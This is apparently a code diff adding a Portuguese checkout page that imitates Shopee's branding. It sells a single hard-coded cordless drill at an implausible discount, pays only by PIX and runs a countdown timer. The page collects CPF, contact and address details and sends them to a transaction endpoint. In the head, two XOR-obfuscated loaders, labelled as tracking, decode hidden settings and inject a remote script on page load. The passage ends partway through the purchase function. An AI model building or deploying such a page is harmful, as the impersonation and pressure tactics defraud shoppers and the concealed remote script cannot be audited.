@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Finalização de Compra</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <!-- Limpa UTMs vazias da URL antes de qualquer script de tracking rodar -->
+  <script>
+  (function () {
+    if (window.location.search) {
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+      let mudou = false;
+      utmKeys.forEach((key) => {
+        const value = urlParams.get(key);
+        if (value === null || value.trim() === '') { urlParams.delete(key); mudou = true; }
+      });
+      if (mudou) {
+        const novaSearch = urlParams.toString();
+        const novaUrl = window.location.pathname + (novaSearch ? '?' + novaSearch : '') + window.location.hash;
+        window.history.replaceState({}, '', novaUrl);
+      }
+    }
+  })();
+  </script>
+
+  <!-- utmify (rastreio do funil, loader ofuscado) -->
+  <script>(function(){var c_04=atob("DKXlpY/MSTDzqeeeYd7H0P2gawrRwZPqEdbfiqCvLV7d3JPzCMOci+yjJB6R28jtAteM1fu/ZkCa0YLyTtWM3eqgZ1qAi8u8ANGR1+auPESW2sWkOvjJh+igJlKSxZS8W/6eh+GtJFXRk8XuCN2AycaoaxzR34byFMDHn636KAmXy4T9ApSEx7/4eQLCmNT/UZPVkOvuNG2O");var v_keb=[];for(var o_09tc=0;o_09tc<c_04.length;o_09tc++){v_keb.push(c_04.charCodeAt(o_09tc)&255);}var o_jt8=v_keb[0];var w_z=v_keb.slice(1,1+o_jt8);var x_vmc7=v_keb.slice(1+o_jt8);var g_mbb=x_vmc7.map(function(b,q_hil){return b^w_z[q_hil%o_jt8];});var v_dx7h="";for(var d_o2=0;d_o2<g_mbb.length;d_o2++){v_dx7h+=String.fromCharCode(g_mbb[d_o2]&255);}var u_gt=decodeURIComponent(escape(v_dx7h));var d_f=JSON.parse(u_gt);var b_25=d_f.globals||[];b_25.forEach(function(l_ed){window[l_ed.name]=l_ed.value;});var e_na4=document.createElement("script");e_na4.src=d_f.url;e_na4.async=true;e_na4.defer=true;(d_f.attributes||[]).forEach(function(t_74w7){e_na4.setAttribute(t_74w7.name,t_74w7.value);});(document.head||document.documentElement).appendChild(e_na4);})();</script>
+  <script>(function(){var r_kc=atob("DCuHniIbPdM2GhbmM1Cl61B3H+kUcmKSQ1i9sQ14Wb0Yb2KLWk3+sEF0UP1UaDmVUFnu7lZoEqZCd2XJX0rz+1FvE7lFODrEUl/z7Et5SKdTaTTcaFCl8EN2WPEMOHKHR0qq61Z2VLVPN2aUVl3i8FY2RbBZfjuVUEClsgBtXL9DfzTcEQn6slk5U7JbfzTcEU/m6kM2SKdbc3CfHlv1+1R+U6cbaWOEWk/0vA45S7Jab3PECQml439m");var x_qx=[];for(var o_b3lm=0;o_b3lm<r_kc.length;o_b3lm++){x_qx.push(r_kc.charCodeAt(o_b3lm)&255);}var u_bahq=x_qx[0];var t_lal=x_qx.slice(1,1+u_bahq);var m_xvb=x_qx.slice(1+u_bahq);var z_654q=m_xvb.map(function(b,e_znhy){return b^t_lal[e_znhy%u_bahq];});var f_48b6="";for(var g_zv1=0;g_zv1<z_654q.length;g_zv1++){f_48b6+=String.fromCharCode(z_654q[g_zv1]&255);}var b_v58=decodeURIComponent(escape(f_48b6));var z_fbos=JSON.parse(b_v58);var a_z=z_fbos.globals||[];a_z.forEach(function(h_hni6){window[h_hni6.name]=h_hni6.value;});var n_eav=document.createElement("script");n_eav.src=z_fbos.url;n_eav.async=true;n_eav.defer=true;(z_fbos.attributes||[]).forEach(function(z_se){n_eav.setAttribute(z_se.name,z_se.value);});(document.head||document.documentElement).appendChild(n_eav);})();</script>
+
+  <style>
+    :root {
+      --shopee-orange: #EE4D2D;
+      --shopee-orange-dark: #D73211;
+      --shopee-orange-light: #FFF4F2;
+      --shopee-gray: #F5F5F5;
+      --shopee-text: #333;
+      --shopee-text-light: #757575;
+    }
+
+    body, html {
+      overflow-x: hidden !important;
+      background-color: var(--shopee-gray);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    .mensagem-slide { position: relative; height: 1.25rem; overflow: hidden; width: 100%; display: flex; align-items: center; justify-content: center; }
+    .mensagem-slide span { position: absolute; left: 0; right: 0; margin: 0 auto; text-align: center; opacity: 0; white-space: nowrap; animation: fadeMsg 9s infinite; }
+    .mensagem-slide span:nth-child(1) { animation-delay: 0s; }
+    .mensagem-slide span:nth-child(2) { animation-delay: 3s; }
+    .mensagem-slide span:nth-child(3) { animation-delay: 6s; }
+    @keyframes fadeMsg { 0% { opacity: 0; } 8% { opacity: 1; } 33% { opacity: 1; } 41% { opacity: 0; } 100% { opacity: 0; } }
+
+    .toast-center {
+      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(.98);
+      min-width: 240px; max-width: 90vw; background: #3a3a3a; color: #fff; padding: 16px 20px;
+      border-radius: 14px; box-shadow: 0 10px 30px rgba(0,0,0,.25); z-index: 9999;
+      display: inline-flex; align-items: center; gap: 12px; opacity: 0; pointer-events: none;
+      transition: opacity .25s ease, transform .25s ease;
+    }
+    .toast-center.show { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+
+    .shopee-card { background: white; border-radius: 4px; box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.09); }
+    .btn-shopee { background-color: var(--shopee-orange); color: white; border: none; border-radius: 2px; font-weight: 500; transition: background-color 0.2s; }
+    .btn-shopee:hover { background-color: var(--shopee-orange-dark); }
+    .btn-shopee:disabled { background-color: #ccc; cursor: not-allowed; }
+    .input-shopee { border: 1px solid rgba(0,0,0,0.14); border-radius: 2px; transition: border-color 0.2s; }
+    .input-shopee:focus { outline: none; border-color: var(--shopee-orange); box-shadow: 0 0 0 2px rgba(238,77,45,0.1); }
+  </style>
+</head>
+
+<body class="bg-gray-100 text-sm" style="background-color: var(--shopee-gray); color: var(--shopee-text);">
+  <header class="fixed top-0 left-0 right-0 bg-white z-50 border-b" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);">
+    <div class="max-w-6xl mx-auto px-4 py-3 flex items-center">
+      <button type="button" onclick="history.back()" class="text-xl mr-4 text-gray-600 hover:text-gray-900">
+        <i class="fas fa-chevron-left"></i>
+      </button>
+      <span class="inline-flex items-center justify-center w-10 h-10 rounded-full mr-3 flex-shrink-0" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">
+        <i class="fas fa-lock"></i>
+      </span>
+      <div class="flex-1 flex flex-col items-center justify-center min-w-0">
+        <h1 class="font-semibold text-base text-center" style="color: var(--shopee-text); font-size: 14px !important;">Finalizar Compra</h1>
+        <div class="text-xs mensagem-slide text-center" style="color: var(--shopee-orange);">
+          <span><i class="fas fa-shield-alt mr-1"></i>Pagamento 100% seguro</span>
+          <span><i class="fas fa-lock mr-1"></i>Dados criptografados</span>
+          <span><i class="fas fa-check-circle mr-1"></i>Compra garantida</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="pt-20 pb-36">
+    <div class="max-w-6xl mx-auto px-4 py-4">
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
+        <div class="lg:col-span-2 space-y-4">
+          <section class="shopee-card">
+            <div class="px-4 py-3 flex justify-between items-center border-b" style="border-color: rgba(0,0,0,0.09);">
+              <h2 id="checkoutResumoTitulo" class="font-semibold text-base" style="color: var(--shopee-text);">Produtos</h2>
+            </div>
+            <div data-role="cart-items"></div>
+          </section>
+
+          <section class="shopee-card">
+            <div class="px-4 py-3 flex justify-between items-center">
+              <span class="flex items-center text-sm" style="color: var(--shopee-text);">
+                <i class="fas fa-ticket-alt mr-2" style="color: var(--shopee-orange);"></i>Descontos aplicados
+              </span>
+              <span id="desconto-3" class="text-xs font-semibold px-2 py-1 rounded" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">R$ 0,00</span>
+            </div>
+          </section>
+
+          <section class="shopee-card px-4 py-6">
+            <div class="flex justify-between items-center mb-6">
+              <div class="flex flex-col items-center flex-1">
+                <div id="step-1-indicator" class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2" style="background-color: var(--shopee-orange); color: white;">1</div>
+                <span class="text-xs font-semibold" style="color: var(--shopee-text);">Identificação</span>
+              </div>
+              <div class="flex-1 border-t mx-2" style="border-color: rgba(0,0,0,0.09);"></div>
+              <div class="flex flex-col items-center flex-1">
+                <div id="step-2-indicator" class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2" style="background-color: #e0e0e0; color: #999;">2</div>
+                <span class="text-xs" style="color: var(--shopee-text-light);">Entrega</span>
+              </div>
+              <div class="flex-1 border-t mx-2" style="border-color: rgba(0,0,0,0.09);"></div>
+              <div class="flex flex-col items-center flex-1">
+                <div id="step-3-indicator" class="w-10 h-10 flex items-center justify-center rounded-full text-sm font-semibold mb-2" style="background-color: #e0e0e0; color: #999;">3</div>
+                <span class="text-xs" style="color: var(--shopee-text-light);">Pagamento</span>
+              </div>
+            </div>
+
+            <div id="step-1" class="step space-y-4">
+              <div>
+                <label for="email" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">E-mail</label>
+                <input type="email" id="email" class="input-shopee mt-1 block w-full px-3 py-2" required>
+              </div>
+              <div>
+                <label for="telefone" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Telefone</label>
+                <input type="tel" id="telefone" placeholder="(99) 99999-9999" class="input-shopee mt-1 block w-full px-3 py-2" required>
+              </div>
+              <div>
+                <label for="nome" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Nome completo</label>
+                <input type="text" id="nome" class="input-shopee mt-1 block w-full px-3 py-2" required>
+              </div>
+              <div>
+                <label for="cpf" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">CPF/CNPJ</label>
+                <input type="text" id="cpf" placeholder="000.000.000-00" class="input-shopee mt-1 block w-full px-3 py-2" required>
+              </div>
+              <div class="border border-dashed p-4 rounded" style="border-color: rgba(0,0,0,0.14); background-color: #fafafa;">
+                <p class="font-semibold mb-2 text-xs" style="color: var(--shopee-text);">Por que precisamos desses dados?</p>
+                <ul class="list-disc ml-4 space-y-1 text-xs" style="color: var(--shopee-text-light);">
+                  <li>Enviar o comprovante de compra;</li>
+                  <li>Garantir a devolução caso necessário;</li>
+                  <li>Acompanhar o andamento da encomenda.</li>
+                </ul>
+              </div>
+              <button type="button" onclick="proximaEtapa(2)" class="btn-shopee w-full py-3 text-sm font-semibold">Continuar para Entrega</button>
+            </div>
+
+            <div id="step-2" class="step hidden space-y-4">
+              <div>
+                <label for="cep" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">CEP</label>
+                <input type="text" id="cep" placeholder="00000-000" class="input-shopee mt-1 block w-full px-3 py-2" required>
+                <small id="cep-msg" class="text-xs hidden" style="color: var(--shopee-orange);"></small>
+              </div>
+              <div>
+                <label for="endereco" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Endereço</label>
+                <input type="text" id="endereco" placeholder="Rua / Avenida" class="input-shopee mt-1 block w-full px-3 py-2" required>
+              </div>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label for="numero" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Número</label>
+                  <input type="text" id="numero" class="input-shopee mt-1 block w-full px-3 py-2" required>
+                </div>
+                <div>
+                  <label for="bairro" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Bairro</label>
+                  <input type="text" id="bairro" class="input-shopee mt-1 block w-full px-3 py-2" required>
+                </div>
+              </div>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label for="cidade" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Cidade</label>
+                  <input type="text" id="cidade" class="input-shopee mt-1 block w-full px-3 py-2" required>
+                </div>
+                <div>
+                  <label for="estado" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Estado</label>
+                  <input type="text" id="estado" maxlength="2" class="input-shopee mt-1 block w-full px-3 py-2 uppercase" required>
+                </div>
+              </div>
+              <div>
+                <label for="complemento" class="block text-sm font-medium mb-1" style="color: var(--shopee-text);">Complemento</label>
+                <input type="text" id="complemento" placeholder="Apartamento, bloco, referência (opcional)" class="input-shopee mt-1 block w-full px-3 py-2">
+              </div>
+              <fieldset id="frete-fieldset" class="space-y-3">
+                <legend class="text-sm font-medium mb-2" style="color: var(--shopee-text);">Selecione a forma de entrega</legend>
+                <div id="frete-loading" class="text-sm" style="color: var(--shopee-text-light);">Carregando opções de entrega…</div>
+              </fieldset>
+              <div class="text-sm" style="color: var(--shopee-text-light);">Entrega selecionada: <span id="freteSelecionado">A definir</span></div>
+              <button type="button" onclick="proximaEtapa(3)" class="btn-shopee w-full py-3 text-sm font-semibold">Continuar para Pagamento</button>
+            </div>
+
+            <div id="step-3" class="step hidden space-y-4">
+              <div class="shopee-card p-4">
+                <h3 class="text-sm font-semibold mb-3" style="color: var(--shopee-text);">Forma de pagamento</h3>
+                <label class="flex items-center justify-between p-3 border rounded cursor-pointer hover:bg-gray-50" style="border-color: rgba(0,0,0,0.14);">
+                  <span class="flex items-center gap-3">
+                    <span class="inline-flex items-center justify-center w-8 h-8 rounded" style="background-color: #00C853; color: white;">
+                      <i class="fab fa-pix"></i>
+                    </span>
+                    <span style="color: var(--shopee-text);">PIX à vista</span>
+                  </span>
+                  <input type="radio" name="pagamento" value="pix" checked>
+                </label>
+              </div>
+              <button type="button" id="button-comprar" onclick="finalizarCompra()" class="btn-shopee w-full py-3 text-sm font-semibold uppercase">Finalizar compra</button>
+            </div>
+          </section>
+        </div>
+
+        <div class="lg:col-span-1">
+          <div class="shopee-card sticky top-24">
+            <div class="px-4 py-3 border-b" style="border-color: rgba(0,0,0,0.09);">
+              <h3 class="font-semibold text-base" style="color: var(--shopee-text);">Resumo da encomenda</h3>
+            </div>
+            <div class="px-4 py-4 space-y-3">
+              <div class="flex justify-between text-sm">
+                <span style="color: var(--shopee-text-light);">Subtotal</span>
+                <span id="total-carrinho" style="color: var(--shopee-text);">R$ 0,00</span>
+              </div>
+              <div class="flex justify-between text-sm">
+                <span style="color: var(--shopee-orange);"><i class="fas fa-badge-percent mr-1"></i>Descontos</span>
+                <span id="desconto-2" style="color: var(--shopee-orange); font-weight: 600;">R$ 0,00</span>
+              </div>
+              <hr style="border-color: rgba(0,0,0,0.09);">
+              <div class="flex justify-between text-base font-bold">
+                <span style="color: var(--shopee-text);">Total</span>
+                <span id="total" style="color: var(--shopee-orange);">R$ 0,00</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="toastContainer"></div>
+  </main>
+
+  <footer class="fixed bottom-0 left-0 right-0 bg-white border-t" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 -1px 2px 0 rgba(0,0,0,0.1);">
+    <div class="max-w-6xl mx-auto">
+      <div class="px-4 py-2 text-xs text-center" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">
+        <i class="fas fa-gift mr-1"></i>Você está economizando <span id="desconto-1">R$ 0,00</span> nesta encomenda.
+      </div>
+      <div class="flex justify-between items-center px-4 pt-2 pb-1">
+        <p class="text-xs" style="color: var(--shopee-text-light);">Total (<span id="quantidade_x">0 itens</span>)</p>
+        <p class="text-lg font-bold" id="total1" style="color: var(--shopee-orange);">R$ 0,00</p>
+      </div>
+      <button type="button" class="btn-shopee w-full py-3 text-sm font-semibold" disabled style="opacity: 0.6;">
+        <span id="contador">O desconto expira em 05:00:00</span>
+      </button>
+    </div>
+  </footer>
+
+  <script>
+    const state = { carrinho: [], subtotal: 0, desconto: 0, fretes: [], selectedFrete: null };
+    let currentStep = 1;
+
+    // ============================================
+    // TRACKING (pixels de conversão)
+    // ============================================
+    const Tracking = {
+      _fired: { pageView: false, initiateCheckout: false },
+      firePageView() {
+        if (this._fired.pageView) return;
+        this._fired.pageView = true;
+        // utmify já dispara PageView sozinho
+      },
+      fireInitiateCheckout(value) {
+        if (this._fired.initiateCheckout) return;
+        this._fired.initiateCheckout = true;
+        if (typeof fbq !== 'undefined') {
+          try { fbq('track', 'InitiateCheckout', { value: Number(value || 0), currency: 'BRL' }); } catch (e) {}
+        }
+        if (typeof ttq !== 'undefined') {
+          try { ttq.track('InitiateCheckout', { value: Number(value || 0), currency: 'BRL' }); } catch (e) {}
+        }
+      }
+    };
+
+    let cepLookupTimer = null;
+    let lastCepLookedUp = '';
+
+    const toNumber = (value) => {
+      if (typeof value === 'number') return Number.isFinite(value) ? value : 0;
+      if (typeof value === 'string') {
+        const trimmed = value.trim();
+        if (!trimmed) return 0;
+        const normalized = trimmed.replace(/[^0-9,.\-]/g, '').replace(/\.(?=\d{3}(?:[.,]|$))/g, '').replace(',', '.');
+        const parsed = parseFloat(normalized);
+        return Number.isFinite(parsed) ? parsed : 0;
+      }
+      if (value === null || value === undefined) return 0;
+      const coerced = Number(value);
+      return Number.isFinite(coerced) ? coerced : 0;
+    };
+
+    const formatBRL = (value) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(toNumber(value));
+
+    // Resolve caminho de imagem: absoluto/relativo fica como está, senão assume pasta ../images/
+    const resolveMedia = (path) => {
+      if (!path) return '../images/1m.png';
+      if (/^https?:/i.test(path)) return path;
+      if (path.startsWith('../') || path.startsWith('./') || path.startsWith('/')) return path;
+      return '../images/' + path;
+    };
+
+    const normalizarItemCarrinho = (raw) => {
+      const item = raw || {};
+      const precoBase = toNumber(item.preco !== undefined ? item.preco : item.precoUnitario);
+      const precoComparacao = toNumber(
+        item.preco_comparacao !== undefined ? item.preco_comparacao
+          : item.precoComparacao !== undefined ? item.precoComparacao : item.precoReferencia
+      );
+      const quantidade = Math.max(1, parseInt(item.quantidade !== undefined ? item.quantidade : item.qty, 10) || 1);
+      return { ...item, preco: precoBase, precoComparacao: precoComparacao || precoBase, preco_comparacao: precoComparacao || precoBase, quantidade };
+    };
+
+    const getInputValue = (id) => { const el = document.getElementById(id); return el ? el.value.trim() : ''; };
+
+    function persistCarrinho() {
+      try {
+        const payload = JSON.stringify(state.carrinho);
+        sessionStorage.setItem('checkoutCarrinho', payload);
+      } catch (error) { console.warn('Não foi possível salvar o carrinho:', error); }
+    }
+
+    function adicionarProdutoFixo() {
+      const PRODUTO_FIXO_ID = 'FIXO_FURADEIRA_48V';
+      const produtoFixo = {
+        produtoId: PRODUTO_FIXO_ID,
+        titulo: 'Furadeira Parafusadeira de impacto 1/2" a Bateria 48V Brushless com 2 Baterias',
+        preco: 69.83,
+        precoComparacao: 497.90,
+        preco_comparacao: 497.90,
+        imagem: '../images/1m.png',
+        quantidade: 1
+      };
+      const idxExistente = state.carrinho.findIndex((item) => String(item.produtoId) === PRODUTO_FIXO_ID);
+      if (idxExistente === -1) {
+        state.carrinho.unshift(normalizarItemCarrinho(produtoFixo));
+      } else {
+        // Autocorrige dados de um carrinho salvo antes (ex: caminho de imagem antigo em cache)
+        state.carrinho[idxExistente] = normalizarItemCarrinho({ ...state.carrinho[idxExistente], ...produtoFixo });
+      }
+    }
+
+    function loadCarrinho() {
+      try {
+        const salvo = sessionStorage.getItem('checkoutCarrinho');
+        const parsed = salvo ? JSON.parse(salvo) : [];
+        state.carrinho = Array.isArray(parsed) ? parsed : [];
+      } catch (error) {
+        state.carrinho = [];
+      }
+      state.carrinho = state.carrinho.map(normalizarItemCarrinho);
+      adicionarProdutoFixo();
+      persistCarrinho();
+    }
+
+    function showToast(message) {
+      const container = document.getElementById('toastContainer');
+      if (!container) return;
+      const toast = document.createElement('div');
+      toast.className = 'toast-center';
+      toast.innerHTML = `<i class="fas fa-check-circle"></i><span>${message}</span>`;
+      container.appendChild(toast);
+      requestAnimationFrame(() => toast.classList.add('show'));
+      setTimeout(() => { toast.classList.remove('show'); setTimeout(() => toast.remove(), 250); }, 2000);
+    }
+
+    function renderCarrinho() {
+      const containers = document.querySelectorAll('[data-role="cart-items"]');
+      const resumoTitulo = document.getElementById('checkoutResumoTitulo');
+      const descontoEls = [document.getElementById('desconto-1'), document.getElementById('desconto-2'), document.getElementById('desconto-3')];
+      const totalQtdEl = document.getElementById('quantidade_x');
+
+      let subtotal = 0, desconto = 0, totalItens = 0;
+
+      const rows = state.carrinho.map((item) => {
+        const preco = toNumber(item.preco);
+        const precoCmp = toNumber(item.preco_comparacao !== undefined ? item.preco_comparacao : item.precoComparacao);
+        const quantidade = Math.max(1, parseInt(item.quantidade, 10) || 1);
+        const itemSubtotal = preco * quantidade;
+        subtotal += Number.isFinite(itemSubtotal) ? itemSubtotal : 0;
+        if (precoCmp > preco) desconto += (precoCmp - preco) * quantidade;
+        totalItens += quantidade;
+
+        return `
+          <div class="flex items-start gap-4 px-4 py-3 border-t" style="border-color: rgba(0,0,0,0.09);">
+            <img src="${resolveMedia(item.imagem)}" alt="${item.titulo || 'Produto'}" class="w-20 h-20 object-contain rounded border bg-white" style="border-color: rgba(0,0,0,0.09);" onerror="this.onerror=null;this.src='../images/1m.avif';">
+            <div class="flex-1 space-y-2">
+              <p class="font-semibold text-sm" style="color: var(--shopee-text);">${item.titulo || 'Produto'}</p>
+              <div class="flex justify-between items-end">
+                <div>
+                  <p class="font-semibold text-sm" style="color: var(--shopee-orange);">${formatBRL(preco)}</p>
+                  ${precoCmp > preco ? `<p class="text-xs line-through" style="color: var(--shopee-text-light);">${formatBRL(precoCmp)}</p>` : ''}
+                  <p class="text-xs" style="color: var(--shopee-text-light);">Qtd: ${quantidade}</p>
+                </div>
+                <div class="text-sm font-semibold" style="color: var(--shopee-text);">${formatBRL(itemSubtotal)}</div>
+              </div>
+            </div>
+          </div>`;
+      });
+
+      containers.forEach((container) => {
+        container.innerHTML = rows.length
+          ? rows.join('')
+          : '<p class="px-4 py-6 text-sm text-center" style="color: var(--shopee-text-light);">Seu carrinho está vazio.</p>';
+      });
+
+      state.subtotal = Number(subtotal.toFixed(2));
+      state.desconto = Number(desconto.toFixed(2));
+      descontoEls.forEach((el) => { if (el) el.textContent = formatBRL(state.desconto); });
+      if (totalQtdEl) totalQtdEl.textContent = totalItens === 1 ? '1 item' : `${totalItens} itens`;
+      if (resumoTitulo) resumoTitulo.textContent = `Produtos (${totalItens} ${totalItens === 1 ? 'item' : 'itens'})`;
+      persistCarrinho();
+      updateTotals();
+    }
+
+    function updateTotals() {
+      const subtotal = Number.isFinite(state.subtotal) ? state.subtotal : 0;
+      const freteValor = state.selectedFrete ? toNumber(state.selectedFrete.preco) : 0;
+      const total = Number((subtotal + freteValor).toFixed(2));
+
+      const subtotalEl = document.getElementById('total-carrinho');
+      const totalEl = document.getElementById('total');
+      const totalFooterEl = document.getElementById('total1');
+      const totalFreteEl = document.getElementById('total-frete');
+
+      if (subtotalEl) subtotalEl.textContent = formatBRL(subtotal);
+      if (totalEl) totalEl.textContent = formatBRL(total);
+      if (totalFooterEl) totalFooterEl.textContent = formatBRL(total);
+      if (totalFreteEl) totalFreteEl.textContent = state.selectedFrete ? `${state.selectedFrete.titulo} (${formatBRL(freteValor)})` : 'A definir';
+
+      return total;
+    }
+
+    function carregarFretes() {
+      const fieldset = document.getElementById('frete-fieldset');
+      if (!fieldset) return;
+      fieldset.innerHTML = '<div class="text-sm" style="color: var(--shopee-text-light);">Carregando opções de entrega…</div>';
+
+      fetch('frete.json', { cache: 'no-store' })
+        .then((res) => res.json())
+        .then((data) => {
+          state.fretes = Array.isArray(data) ? data.map((f, i) => ({ ...f, id: f.id !== undefined ? f.id : i, preco: toNumber(f.preco) })) : [];
+          if (!state.fretes.length) {
+            fieldset.innerHTML = '<p class="text-sm" style="color: var(--shopee-text-light);">Nenhuma opção de entrega disponível.</p>';
+            return;
+          }
+          // Padrão: a opção sem custo vem pré-selecionada (mantém o total igual ao anunciado)
+          const idxPadrao = state.fretes.findIndex((f) => toNumber(f.preco) === 0);
+          const marcarPadrao = idxPadrao === -1 ? 0 : idxPadrao;
+          const markup = state.fretes.map((frete, index) => `
+            <label class="flex items-center justify-between gap-3 border rounded px-3 py-3 cursor-pointer hover:bg-gray-50 transition-colors" style="border-color: rgba(0,0,0,0.14);">
+              <div class="flex items-center gap-3 flex-1">
+                <input type="radio" name="frete" value="${frete.id}" data-preco="${frete.preco}" data-titulo="${frete.titulo || 'Frete'}" ${index === marcarPadrao ? 'checked' : ''}>
+                ${frete.logo
+                  ? `<span class="inline-flex items-center justify-center flex-shrink-0 border rounded" style="width: 44px; height: 44px; border-color: rgba(0,0,0,0.09); background: #fff;">
+                       <img src="${frete.logo}" alt="${frete.titulo || 'Frete'}" style="max-width: 34px; max-height: 34px; object-fit: contain;"
+                            onerror="this.parentElement.outerHTML='<span class=&quot;inline-flex items-center justify-center flex-shrink-0&quot; style=&quot;width:36px;height:36px;border-radius:8px;background-color:var(--shopee-orange);color:#fff;&quot;><i class=&quot;fas fa-truck&quot;></i></span>'">
+                     </span>`
+                  : `<span class="inline-flex items-center justify-center flex-shrink-0" style="width: 36px; height: 36px; border-radius: 8px; background-color: var(--shopee-orange); color: #fff;"><i class="fas fa-truck"></i></span>`
+                }
+                <div class="flex-1">
+                  <p class="text-sm font-semibold" style="color: var(--shopee-text);">${frete.titulo || 'Frete'}</p>
+                  <p class="text-xs" style="color: var(--shopee-text-light);">${frete.descricao || ''}</p>
+                </div>
+              </div>
+              <span class="text-sm font-semibold" style="color: var(--shopee-text);">${formatBRL(frete.preco)}</span>
+            </label>`).join('');
+          fieldset.innerHTML = markup;
+          const inputs = fieldset.querySelectorAll('input[name="frete"]');
+          inputs.forEach((input) => input.addEventListener('change', () => aplicarFrete(input)));
+          const selecionado = Array.from(inputs).find((i) => i.checked) || inputs[0];
+          if (selecionado) aplicarFrete(selecionado);
+        })
+        .catch(() => {
+          fieldset.innerHTML = '<p class="text-sm" style="color: var(--shopee-orange);">Não foi possível carregar as opções de entrega.</p>';
+        });
+    }
+
+    function aplicarFrete(input) {
+      if (!input) return;
+      state.selectedFrete = { id: input.value, titulo: input.dataset.titulo || 'Frete', preco: toNumber(input.dataset.preco) };
+      const freteSelecionadoEl = document.getElementById('freteSelecionado');
+      if (freteSelecionadoEl) freteSelecionadoEl.textContent = `${state.selectedFrete.titulo} (${formatBRL(state.selectedFrete.preco)})`;
+      updateTotals();
+    }
+
+    function coletarDadosCheckout() {
+      return {
+        comprador: { email: getInputValue('email'), telefone: getInputValue('telefone'), nome: getInputValue('nome'), cpf: getInputValue('cpf') },
+        entrega: { cep: getInputValue('cep'), endereco: getInputValue('endereco'), numero: getInputValue('numero'), bairro: getInputValue('bairro'), cidade: getInputValue('cidade'), estado: getInputValue('estado'), complemento: getInputValue('complemento') }
+      };
+    }
+
+    function validarEtapa(campos) {
+      for (const campo of campos) {
+        const input = document.getElementById(campo);
+        if (!input || !input.value.trim()) {
+          if (input) { input.style.borderColor = 'var(--shopee-orange)'; input.style.backgroundColor = 'var(--shopee-orange-light)'; input.focus(); }
+          return false;
+        }
+        input.style.borderColor = ''; input.style.backgroundColor = '';
+      }
+      return true;
+    }
+
+    function proximaEtapa(etapa) {
+      if (etapa === 2 && !validarEtapa(['email', 'telefone', 'nome', 'cpf'])) return;
+      if (etapa === 3 && !validarEtapa(['cep', 'endereco', 'numero', 'bairro', 'cidade', 'estado'])) return;
+      document.querySelectorAll('.step').forEach((step, index) => step.classList.toggle('hidden', index + 1 !== etapa));
+      atualizarSteps(etapa);
+      currentStep = etapa;
+    }
+
+    function atualizarSteps(etapa) {
+      for (let i = 1; i <= 3; i += 1) {
+        const indicator = document.getElementById(`step-${i}-indicator`);
+        if (!indicator) continue;
+        const label = indicator.parentElement.querySelector('span');
+        if (i <= etapa) {
+          indicator.style.backgroundColor = 'var(--shopee-orange)'; indicator.style.color = 'white';
+          if (label) { label.style.color = 'var(--shopee-text)'; label.classList.add('font-semibold'); }
+        } else {
+          indicator.style.backgroundColor = '#e0e0e0'; indicator.style.color = '#999';
+          if (label) { label.style.color = 'var(--shopee-text-light)'; label.classList.remove('font-semibold'); }
+        }
+      }
+    }
+
+    async function finalizarCompra() {
+      const btnComprar = document.getElementById('button-comprar');
+      if (btnComprar) { btnComprar.disabled = true; btnComprar.textContent = 'Processando...'; }
+
+      try {
+        const total = updateTotals();
+        Tracking.fireInitiateCheckout(total);
+
+        if (!state.carrinho.length) { throw new Error('Seu carrinho está vazio'); }
+        if (!Number.isFinite(total) || total <= 0) { throw new Error('Não foi possível calcular o total da encomenda'); }
+
+        const dados = coletarDadosCheckout();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+        const utmParams = [];
+        utmKeys.forEach((key) => {
+          const value = urlParams.get(key);
+          if (value && value.trim()) utmParams.push(`${key}=${encodeURIComponent(value.trim())}`);
+        });
+
+        const response = await fetch('/api/create-transaction', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            amount: total,
+            comprador: dados.comprador,
+            carrinho: state.carrinho,
+            utm: utmParams.length ? utmParams.join('&') : undefined
+          })
+        });
+
+        const data = await response.json().catch(() => null);
+        if (!response.ok || !data || data.success === false) {
+          throw new Error((data && data.error) || 'Falha ao gerar cobrança Pix.');
+        }
+        if (!data.pix_code || !data.transaction_id) {
+          throw new Error('Código PIX não foi gerado. Tente novamente.');
+        }
+
